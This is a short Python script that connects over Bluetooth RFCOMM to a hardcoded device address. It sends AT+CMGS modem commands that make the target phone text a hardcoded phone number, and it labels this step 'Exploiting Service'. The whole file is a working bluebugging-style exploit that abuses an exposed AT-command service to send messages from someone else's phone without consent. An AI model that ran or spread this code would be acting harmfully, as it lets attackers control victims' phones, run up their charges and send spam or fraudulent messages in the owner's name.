import bluetooth
import time

def connect_to_device(address):
    try:
        server_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        server_sock.connect((address, 16))
        print(f"Connected to {address}")
        return server_sock
    except Exception as e:
        print(f"Error connecting to {address}: {e}")
        return None

def send_sms(server_sock, recipient, message):
    print("sending msg")
    command = f"AT+CMGS=\"{recipient}\"\r"
    server_sock.send(command.encode())
    time.sleep(1)
    server_sock.send(message.encode())
    time.sleep(1)
    server_sock.send(chr(26).encode())
    time.sleep(1)

def main():
    addresses = ["20:CD:6E:35:15:68"]   
    print(f"Connecting to {len(addresses)} devices")
    for address in addresses:
        print(f"Connecting to {address}")
        server_sock = connect_to_device(address)
        if server_sock is None:
            continue

        print("Exploiting Service (10)")

        # Send an SMS to a recipient
        recipient = "9440903979"
        message = "This is a test message."
        send_sms(server_sock, recipient, message)

        server_sock.close()

if __name__ == "__main__":
    main()
